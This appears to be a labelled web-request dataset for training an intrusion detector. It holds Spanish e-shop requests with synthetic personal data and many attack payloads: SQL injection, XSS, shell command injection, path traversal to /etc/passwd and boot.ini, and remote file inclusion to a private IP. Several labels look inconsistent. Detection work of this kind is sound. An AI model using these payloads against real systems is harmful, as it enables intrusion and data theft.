request	label
/ string / modo = entrar & login = godish & pwd = cog6aticio & remember = on & b1 = entrar 	0
/ string / strings / parameters = ;  str =  $  ( echo kwxvrq )  ;  str1 =  $  {  # str }  ;  if  [  7 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  | 	1
/ notescfp03 / 	0
"/ string / strings / parameters = < form action =  "" javascript : alert ( 1 )  ""  >  < input type = submit >   /  /  firefox ,  ie "	1
/ string / modo = registro & login = nataniel & password = 53rd11c4 & nombre = ligia & apellidos = klindt + vanega & email = cordon4 @ hojainformativas . je & dni = 96785368b & direcciona = pintor + clemente + de + torres + 169 +  & ciudad = prdanos + de + bureba & cp = 09125 & provincia = guadalajara & ntc = 2447487443590870 & b1 = registrar 	1
"/ 8t9v8k7x . x ?  < script > document . cookie =  "" testhvje = 9403 ;  ""  <  / script > "	1
/ libdnet / 	0
/ string / strings / parameters = '  ;  str =  $  ( echo wsgiyr )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' 	1
/ 07vid_10 / 	0
/ string / modo = registro & login = boeck & password = atelaje & nombre = ina & apellidos = de + agreda + bellmunt & email = quester @ expozaragozafloral2014 . gq & dni = 87110948n & direccion = calle + atletico + de + madrid ,  + 62 + 6-c & ciudad = valdesamario & cp = 21891 & provinciaa = segovia & ntc = 0738940592435694 & b1 = registrar 	1
/ art_glba / 	0
/ krindacalico / 	0
/ javascript / crash . exe 	1
/ string / strings / parameters = 0u5o 	0
/ string / modo = registro & login = ryszard & password = e1bud8 & nombre = alarico & apellidos = nrez + muriscot & email = gude1 @ messadivoce . ai & dni = 33437614f & direccion = logroo ,  + 98 ,  + 5-d & ciudad = sant + lloren + savall & cp = 09228 & provincia = guadalajara & ntc = 9589985001483437 & b1 = registrar 	0
/ string / strings / parameters = sandie 	0
/ javascript / auth . bz2 	0
"/ 6dlc2zm9 . pl ?  < meta http-equiv = set-cookie content =  "" testqpux = 4016 ""  > "	1
/ string / strings / parameters = 1 '  ; select  ( case when  ( 8642 = 6049 )  then 1 else 8642 *  ( select 8642 from master .  . sysdatabases )  end )  -- 	1
/ index . php ? section = xxpathxx 	1
/ string / strings / parameters = calle pravia 7 	0
/ string / strings / parameters = '  |  | echo axsulh $  (  ( 48 + 60 )  )  $  ( echo axsulh ) axsulh ' 	1
/ 20050602-4963 / 	0
/ 2003law / 	0
/ string / strings / parameters = c /  colinas de bellomonte ,  156 6-c 	0
/ string / modo = insertar & precio = 8322 & b1 = confirmar 	0
/ string / strings / parameters = 1 '  )  where 2330 = 2330 and  ( select  *  from  ( select ( sleep ( 5 )  )  ) fzno )  -- 	1
/ string / strings / parameters = 1 '  )  )  )  or char ( 68 )  |  | char ( 69 )  |  | char ( 97 )  |  | char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 )  , 0 )  , 5000000000 )  , null )  and  (  (  (  ' ujjr '  =  ' ujjr 	1
/ 0dfbb34d49 / 	0
/ javascript / chats . lst 	0
/ string / strings / parameters = anaya pez 	0
"/ string / strings / parameters = ""  | echo wxwddm $  (  ( 64 + 94 )  )  $  ( echo wxwddm ) wxwddm "	1
/ string / strings / parameters = mclawhor 	0
/ v14971307 / 	0
/ modif_infos . asp ? n =  /  .  .  .  .  .  .  / boot . ini 	1
/ kevin anderson / 	0
/ 183203 / 	0
/ report . php ? scriptpath = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ?  ? 	1
/ string / modo = insertar & precio = 2511 & b1 = pasar + por + caja / 	1
/ sjackson / 	0
/ abullet3 / 	0
"/ help . php ? q =  "" ping -w 8000 -n 1 4 . 3 . 2 . 1 & rem "	1
/ gp500v1 / 	0
/ scripts / viewcvs . cgi /  ? cvsroot =  < script > foo <  / script > 	1
/ string / strings / parameters = ' print (  ` echo murmgo echo  $  (  ( 13 + 87 )  )  echo murmgo echo murmgo `  )  ;  \  \ murmgo 	1
/ cms / orlando / modules / core / logger / init . php ? globals [ preloc ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ?  ? 	0
/ admin / st_platforms . php ? include_path = xxpathxx ? 	1
"/ fc9t54l7 . kspx ?  < meta http-equiv = set-cookie content =  "" testggad = 2000 ""  > "	1
/ javascript / 42 . htm 	0
"/ string / strings / parameters = ""   str =  $  ( echo psdlxw )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  | "	1
/ childrensbacktoschool / 	0
/ cacti / index . php ? search =  '  >  < script > alert (  ' autoindex_search_xss . nasl '  )  ;  <  / script >  & searchmode = f 	1
"/ string / strings / parameters = 1 %  ""  ""  )  and  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 3484 = 3484 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  and  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ string / strings / parameters = 1 or 7427 = dbms_pipe . receive_message ( chr ( 116 )  |  | chr ( 87 )  |  | chr ( 90 )  |  | chr ( 109 )  , 5 )  -- 	1
/ cgi-bin / verify . asp ? username =  ' 	1
/ string / strings / parameters = datario 	0
/ string / modo = registro & login = purchasi & password = de2ape91ibi1ie4to & nombre = rosina & apellidos = surroca & email = horst @ engibraltar . com . co & dni = 59137612n & direccion = c /  + san + gines ,  + 180 ,  + 3-d & ciudad = frailes & cp = 50296 & provincia = vila & ntc = 7961872329809538 & b1 = registrar 	0
/ cgi-local / ppdscgi . exe 	1
/ diskmon / 	0
/ 10view / 	0
/ art_202 / 	0
/ string / strings / parameters = '  |  | echo $ ifslnilsc $  (  ( 52 + 23 )  )  $  ( echo $ ifslnilsc ) lnilsc ' 	1
/ cacti / admin / configset . php ? settings_dir =  / etc / passwd \ x00 	1
"/ en-us / i686v90l . php3 ?  < script > document . cookie =  "" testfutf = 1550 ;  ""  <  / script > "	1
/ tolmes / 	0
/ string / strings / parameters = 09030291p 	0
/ string / strings / parameters = 1 )  )  as wwys where 9248 = 9248 ;  ( select  *  from  ( select ( sleep ( 5 )  )  ) srmq )  -- 	1
/ string / modo = registro & login = fina & password = trasabuela & nombre = genero & apellidos = marsal + infante & email = violet @ sunmiles . cf & dni = 03621656f & direccion = c /  + berruguete + 23 ,  +  & ciudad = villanubla & cp = 10650 & provincia = madrid & ntc = 0277189059505279 & b1 = registrar 	0
/ 041721 / 	0
/ string / strings / parameters = 1 )  and extractvalue ( 7982 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 7982 = 7982 , 1 )  )  )  , 0x717a767a71 )  ) 	1
"/ string / strings / parameters = < img src = x onerror =  \ x32 "" javascript : alert ( 1 )  ""  > "	1
"/ ywaxntrx . kspx ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ javascript / dclk . trace 	0
/ copying /  <  / p >  < body >  < script src = http :  /  / www . example . com / test ? rnd = q64711831 >  <  / script >  < p > 	1
/ string / strings / parameters = quintina 	0
/ swgcall / 	0
"/ string / strings / parameters = 1 %  ""  ""  )  ; select  ( case when  ( 9732 = 7136 )  then 9732 else 9732 *  ( select 9732 from information_schema . character_sets )  end )  # "	1
/ big-sheila / 	0
/ string / strings / parameters = < scri	1
"/ top . php ? stuff =  "" ping -w 10000 -n 1 1 . 2 . 3 . 4 & rem "	1
/ string / strings / parameters = ; echo rxpylt $  (  ( 92 + 26 )  )  $  ( echo rxpylt ) rxpylt \ 	1
/ string / modo = registro & login = boony & password = c2lea & nombre = mara + candela & apellidos = otia & email = hammond-mcstay @ enhierro . com . cn & dni = 80537471g & direccion = varadero + 68 ,  + 8-c & ciudad = caminreal & cp = 24717 & provincia = guipzcoa & ntc = 4518310510128542 & b1 = registrar 	0
/ temperature / 	0
/ javascript / showcat . ini 	0
/ string / strings / parameters = 28820 	0
/ string / strings / parameters = 1 '  |  |  ( select  ' znba '  where 8323 = 8323 ; select pg_sleep ( 5 )  -- 	1
/ screencasting / 	0
/ string / strings / parameters = august 	0
/ clapton la forum / 	0
/ javascript / restored . xml 	0
/ string / strings / parameters = 2308021987140157 	0
/ modules / search / search . php ? language_home =  & rootdp = zzz & gslanguage = http :  /  / 192 . 168 . 202 . 118 : 8080 / 2aibfaczmac8 ?  ? 	0
/ string / strings / parameters = almatret 	0
/ string / strings / parameters = nuda drudes 	0
/ editorial_0870 / 	0
/ examples / jsp / jsp2 / jspx / cart32 . exe 	1
"/ string / strings / parameters = ""  echo jkbauz $  (  ( 16 + 4 )  )  $  ( echo jkbauz ) jkbauz ' "	1
/ string / modo = registro & login = bobbette & password = v4n0c76 . se & nombre = albere & apellidos = guri + olls & email = mallalieu @ soymuyguapa . ml & dni = 58990935y & direccion = plaa + puerto + rico ,  + 144 +  & ciudad = guadalajara & cp = 21320 & provincia = soria & ntc = 0626053300449217 & b1 = registrarany ?   set-cookie :  + tamper = 1041264011025374727 	1
/ 145312001 / 	0
"/ ewc3rz1l . mscgi ?  < script > document . cookie =  "" testkgqo = 204 ;  ""  <  / script > "	1
"/ en-us / odzk29aa . aspx ?  < meta http-equiv = set-cookie content =  "" testtfvh = 2141 ""  > "	1
/ bestcos_timberland / 	0
"/ oie504mr . mscgi ?  < script > document . cookie =  "" testtpby = 7052 ;  ""  <  / script > "	1
/ cgi-bin / rot13sj . cgi ?  / etc / passwd 	1
/ summercon_pint / 	0
/ msadc /  .  .  \  .  .  \  .  .  \  .  .  \ winnt / system32 / cmd . exe ?  / c + dir 	1
/ opml_valid / 	0
/ interface / login / login_frame . php ? site =  < script > alert ( owasp zap )  ;  <  / script >  or 1 = 1 	1
/ javascript / me . zip 	0
/ string / strings / parameters = 52943030c 	0
"/ string / strings / parameters = 1 ' qhfy <  '  ""  ""  > utwq "	1
/ string / strings / parameters = 1 '  )  )  as crzr where 5373 = 5373 and elt ( 3114 = 3114 , sleep ( 5 )  )  # 	1
"/ m2fpztty . html ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 0222216 / 	0
"/ string / modo = registro & login = bejar & password = litigar < script > alert (  "" paros ""  )  ;  <  / script >  & nombre = enzo & apellidos = capell + latre & email = borgato @ 19horas . ee & dni = 96483882d & direccion = esperanto ,  + 182 ,  +  & ciudad = sobremunt & cp = 19278 & provincia = alicante & ntc = 2319237634289833 & b1 = registrar "	1
/ string / strings / parameters = '  or 1  --  ' 	1
"/ en-us / jnv890lt . mscgi ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ dir_thatware / config . php ? root_path = http :  /  / 192 . 168 . 202 . 96 : 8080 / swgnhpydbq0t ?  ' 	1
"/ main . php ? logout =  "" ping , -w , 7000 , -n , 1 , 1 . 2 . 3 . 4 & rem , "	1
/ javascript / index2 / 	0
/ string / modo = registro & login = rockford & password = eng68nd13i8ient5 & nombre = saiguen & apellidosa = gramunt + alzuria & email = berthels-dahlbeck @ muevemiweb . br & dni = 87238782n & direccion = pozo + 188 + 3 ? g & ciudad = cceres & cp = 06197 & provincia = valencia & ntc = 8495227312439801 & b1 = registrar 	1
/ 436202 / 	0
"/ main . php ? stuff =  ""  | ping ; -w ; 11000 ; -n ; 1 ; 4 . 3 . 2 . 1 | rem ; "	1
/ javascript / crons . asmx 	0
"/ string / strings / parameters = ""  | echo $ ifstdgccd $  (  ( 4 + 88 )  )  $  ( echo $ ifstdgccd ) tdgccd \ "	1
/ mabry ras-x v1 / 	0
/ pacestar lanflow net diagrammer v5 / 	0
/ examples / jsp / sessions / faq . php ? action =  & type = view & s =  & id = -1 '  union select 0 , 2063805552 , 0 , 0 , 0 , 0 , 0 -- 	1
/ string / id = 3 & nombre = queso + manchego & precio = 100 /  & cantidad = 14 & b1 = aadir + al + carrito 	1
/ 116624 / 	0
/ javascript / intl . manifest 	0
/ 037784 / 	0
/ string / strings / parameters = 20560 	0
/ forum1_professionnel . asp ? n = 1771 & amp ; nn = c :  \ boot . ini & amp ; page = 1 	1
/ examples / jsp / cal / sendtemp . pl ? templ =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ javascript / hu . lib 	0
/ gnav200603_04 / 	0
/ string / strings / parameters = cister grandi 	0
/ string / strings / parameters = , null , null , null )  waitfor delay  ' 0 : 0 : 20 '   /  * 	1
/ cars_41x21 / 	0
/ opinion . exe 	1
/ javascript / treasury . exe 	1
/ 044741 / 	0
"/ string / strings / parameters = ""  '  `  >  < p >  < svg >  < script > a =  ' hello \ x27 ; javascript : alert ( 1 )  /  /  '  ;  <  / script >  <  / p > "	1
/ 145377 / 	0
/ supporter / index . php ? t = tickettime & id =  & lt ; script & gt ;  < script > alert (  ' vulnerable '  )  <  / script >  & lt ;  / script & gt ; 	1
/ javascript / net . doc 	0
/ 734275415 / 	0
/ string / modo = insertar & precio = 8659 & b1 = pasar + por + caja / 	1
/ cov_19feature / 	0
/ festive_festiva / 	0
"/ string / strings / parameters = -7851 ""  ""  )  )  or 6872 = 6872 and  (  (  ""  "" dvbw ""  ""  like  ""  "" dvbw "	1
"/ string / strings / parameters = ""  . print (  ` echo povqex `  .  ` echo  $  (  ( 96 + 65 )  )  `  .  ` echo povqex `  .  ` echo povqex `  )  ;  # povqex "	1
/ b0000dbykr / 	0
/ string / strings / parameters = 85125612j 	0
/ mtaarr / 	0
/ servlet / webacc ? user . html =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini \ x00 	1
/ string / strings / parameters = 57738017j 	0
/ cgi-bin / viewcart . asp ? userid =  ' 	1
/ string / strings / parameters = -1639 )  )  or 5023 = ctxsys . drithsx . sn ( 5023 ,  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  and  (  ( 3318 = 3318 	1
/ eclipsecolorer / 	0
/ 20030925-8 / 	0
/ javascript / citrix . class 	0
"/ string / strings / parameters = 1 ""  ""  and char ( 111 )  |  | char ( 77 )  |  | char ( 121 )  |  | char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  and  ""  "" pmpk ""  ""  like  ""  "" pmpk "	1
"/ main . php ? stuff =  ""  & del \ x0cq27346825 & rem \ x0c "	1
/ recordings / viewcvs . cgi /  ? cvsroot =  < script > foo <  / script > 	1
/ freeforums / 	0
/ string / strings / parameters = hierros 161 10f 	0
"/ 9ko6m4c8 . jspa ?  < meta http-equiv = set-cookie content =  "" testylik = 3403 ""  > "	1
/ main . php ? stuff =  '  \ x0adel q85424597  # 	1
/ string / strings / parameters = -6770 '  )  )  union all select 1845 , 1845 , 1845 , 1845 , 1845 , 1845 , 1845 , 1845 , 1845 # 	1
/ v15041608 / 	0
/ core / adodb / server . php ? sql =  ' adodb_sql_sql_injection . nasl 	1
/ string / strings / parameters = torcac2 	0
/ string / id = 2 & nombre = queso + manchego & precio = 100 & cantidad = 77 & b1 = aadir + al + carrito 	0
"/ scs86g1p . fts ?  < meta http-equiv = set-cookie content =  "" testquyx = 2820 ""  > "	1
/ examples / jsp / sessions / admin / configset . php ? settings_dir =  / etc / passwd \ x00 	1
"/ help . php ? q =  ""  & del \ xa0q49941678 & rem \ xa0 "	1
/ string / strings / parameters = -8923 '  +  ( select xgvz where 9858 = 9858 union all select 9858 , 9858 , 9858 # 	1
/ cgi-bin / phpnews / sendtofriend . php ? mid =  ' 1 ' 	1
/ string / strings / parameters = '  echo $ ifstwuntd $  (  ( 44 + 76 )  )  $  ( echo $ ifstwuntd ) twuntd 	1
/ id-106161 / 	0
/ main . php ? stuff =  '  \ x0drm \ x09q12818567 \ x09 # 	1
/ string / strings / parameters = azorin ,  167 	0
/ string / modo = registro & login = violette & password = entretejedora & nombre = yuraj & apellidos = laumann + mancha & email = groen @ civicosdns . na & dni = 78719482g & direccion = calle + europa + s / n ,  +  & ciudad = cabanillas + de + la + sierra & cp = 18128 & provincia = teruel & ntc = 0890605650691584 & b1 = registrar 	0
/ bravehhheart / 	0
/ string / strings / parameters = pascacio 	0
/ string / modo = registro & login = haralamb & password = po2546oto4 & nombre = amancio & apellidos = daya + basulto & email = gila-berova @ artforall . mm & dni = 06314426y & direccion = c /  + plza .  + 18 ,  + 6-e & ciudad = chimillas & cp = 19144 & provincia = cceres & ntc = 6002328199807748 & b1 = registrar 	0
/ string / modo = registro & login = correa & passworda = 5ortera & nombre = fructuosa & apellidos = polloni + homdedeu & email = berto @ sindualidad . dd & dni = 49742539w & direccion = c /  + einstein ,  + 147 ,  + 9 ? a & ciudad = legazpi & cp = 44349 & provincia = valencia & ntc = 2169388539628734 & b1 = registrar 	1
/  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / windows / win . ini 	1
/ string / strings / parameters = |   [  2 -ne  $  ( echo xwhrps  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  # 	1
"/ string / strings / parameters = ;  str =  $  ( echo vghmvb )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "" "	1
/ pirvate / ltwpdfmonth . php ? ltw_config [  ' include_dir ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ? 	1
/ examples / jsp / error / shopaddtocart . asp ? productid =  ' 42 	1
"/ main . php ? stuff =  ""  & ping \ x0b-w \ x0b8000 \ x0b-n \ x0b1 \ x0b4 . 3 . 2 . 1 & rem \ x0b "	1
/ javascript / admin . py 	0
/ 2245918_1 / 	0
/ 747592011 / 	0
"/ string / strings / parameters = 1 ""  ""  where 9725 = 9725 ; waitfor delay  ' 0 : 0 : 5 '  -- "	1
/ string / strings / parameters = 1 )  as ozga where 4002 = 4002 and 6969 =  ( select 6969 from pg_sleep ( 5 )  )  -- 	1
"/ string / strings / parameters = ""  & echo $ ifsizikxp $  (  ( 4 + 56 )  )  $  ( echo $ ifsizikxp ) izikxp \  \ "	1
/ 139106 / 	0
/ javascript / mods . svn-base 	0
/ javascript / communicator . jsf 	0
"/ rpxyx07v . dll ?  < script > document . cookie =  "" testbnli = 1975 ;  ""  <  / script > "	1
/ mystique / 	0
"/ main . php ? stuff =  ""  & del \ x0bq52976574 & rem \ x0b "	1
"/ g8nu2yy7 . idc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ javascript / programming . jsp 	0
"/ string / strings / parameters = 1 %  ""  ""  )  and 2853 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  and  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ 170827 / 	0
/ strategicpartners / 	0
/ tm-cidr / 	0
"/ string / strings / parameters = < div id =  "" 105 ""  >  < iframe src =  "" data : image / svg-xml , "	1
/ icon_permalink / 	0
"/ string / strings / parameters = ""   str =  $  ( echo daecdg )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \ "	1
/ syshelp / cscript / showfunc . stm ? func =  < script > alert ( document . cookie )  <  / script > 	1
"/ bzuf9ozq . aspx ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ scripts / fpcount . exe 	1
/ string / strings / parameters = kwangchi 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo hmzjiq )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  | 	1
